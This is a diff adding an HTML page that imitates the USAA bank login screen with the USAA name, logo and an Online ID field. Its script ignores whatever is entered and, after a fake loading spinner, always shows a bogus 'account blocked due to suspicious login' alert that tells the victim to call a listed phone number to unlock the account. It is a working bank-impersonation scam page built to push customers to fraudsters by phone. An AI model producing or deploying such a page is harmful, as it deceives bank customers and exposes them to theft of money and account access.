@@ -1,0 +1,221 @@
+﻿<!DOCTYPE html>
+<html>
+  <head>
+    <title>USAA</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #0e2e49;
+        color: white;
+      }
+
+      header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px;
+        border-bottom: 2px solid #0b2237;
+      }
+
+      .logo {
+        width: 80px;
+      }
+
+      .links {
+        display: flex;
+        gap: 20px;
+      }
+
+      .links a {
+        color: white;
+        text-decoration: none;
+      }
+
+      .content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 60px 20px;
+      }
+
+      .content-left {
+        margin-bottom: 40px;
+        text-align: center;
+      }
+
+      .content h1 {
+        font-size: 36px;
+        margin-bottom: 20px;
+      }
+
+      .content p {
+        font-size: 18px;
+        margin-bottom: 40px;
+      }
+
+      .join-button {
+        background-color: #f6f5f5;
+        color: #00668a;
+        font-size: larger;
+        font-weight: 500;
+        padding: 1.5rem;
+        border: none;
+        cursor: pointer;
+      }
+
+      .login-box {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        background-color: white;
+        color: #333;
+        padding: 30px;
+        border-radius: 4px;
+        width: 100%;
+        max-width: 300px;
+      }
+
+      .login-box input {
+        width: 85%;
+        font-size: large;
+        padding: 1.5rem 1.5rem;
+        margin-bottom: 1.5rem;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+      }
+
+      .login-box a {
+        color: #005595;
+        margin-bottom: 1.5rem;
+        text-decoration: none;
+      }
+
+      .login-box button {
+        background-color: #54732d;
+        margin: 1.5rem 0;
+        background: linear-gradient(#54732d, #435c24);
+        box-shadow: inset 0 -2px 0 0 #32451b;
+        color: white;
+        padding: 20px 32px;
+        border: none;
+        border-radius: 4px;
+        font-size: larger;
+        cursor: pointer;
+        width: 100%;
+      }
+
+      @media (min-width: 768px) {
+        .content {
+          flex-direction: row;
+          justify-content: space-around;
+          align-items: start;
+        }
+
+        .content-left {
+          text-align: left;
+        }
+      }
+      .login-btn.loading {
+        position: relative;
+        pointer-events: none;
+        opacity: 0.7;
+      }
+      .login-btn.loading::after {
+        content: "";
+        position: absolute;
+        right: 100px;
+        width: 15px;
+        height: 15px;
+        border: 2px solid #fff;
+        border-top: 2px solid #333;
+        border-radius: 50%;
+        animation: spin 0.6s linear infinite;
+      }
+      @keyframes spin {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <img src="logo.svg" alt="USAA Logo" class="logo" />
+      <div class="links">
+        <a href="#">JOIN USAA</a>
+        <a href="#">REGISTER FOR ACCESS</a>
+      </div>
+    </header>
+
+    <div class="content">
+      <div class="content-left">
+        <h1>New to USAA?</h1>
+        <p>
+          Become a member by selecting "Join USAA" <br />— it's easy and only
+          takes a few minutes.
+        </p>
+        <button class="join-button">Join USAA</button>
+      </div>
+      <div class="login-box">
+        <h2>Log On</h2>
+        <form id="login-form">
+          <input type="text" placeholder="Online ID" required />
+          <a href="#">I need help logging on</a>
+          <button type="submit" class="login-btn">
+            Next
+            <img
+              id="loader"
+              src="loader.gif"
+              alt="Loading..."
+              style="display: none; width: 20px; margin-left: 10px"
+            />
+          </button>
+          <div
+            id="error-message"
+            style="
+              color: #a94442;
+              background-color: #f2dede;
+              border: 1px solid #ebccd1;
+              padding: 10px;
+              margin-top: 8px;
+              text-align: center;
+              border-radius: 4px;
+              display: none;
+            "
+          >
+            Yours Account access has been blocked due to suspicious login
+            attempt. Contact our customer support at
+            <a
+              href="tel:+18089603503"
+              style="color: blue; text-decoration: underline"
+              >+1 808 960 3503</a
+            >
+            to verify and unlock your account.
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          const submitButton = document.querySelector(".login-btn");
+          submitButton.classList.add("loading");
+
+          setTimeout(function () {
+            submitButton.classList.remove("loading");
+            document.getElementById("error-message").style.display = "block";
+          }, 2500);
+        });
+    </script>
+  </body>
+</html>
